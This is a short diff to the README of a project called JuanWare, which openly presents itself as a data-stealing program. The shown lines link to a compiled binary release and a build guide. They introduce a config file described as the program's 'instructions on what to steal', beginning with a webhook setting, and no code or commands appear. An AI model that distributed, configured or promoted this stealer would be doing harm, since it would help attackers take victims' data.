@@ -16,9 +16,10 @@ or
 
 download an already compiled [binary](https://github.com/CIA-Nano-Technologies/JuanWare/releases/latest)
 
-if you dont know how to, follow this [guide](https://love2d.org/wiki/Game_Distribution)
+if you dont know how to build Juan, follow this [guide](https://love2d.org/wiki/Game_Distribution)
 
 Config:
+
 This config file acts kinda like Juans instructions on what to steal, heres a short explanation on all of em:
 
 `Webhook`
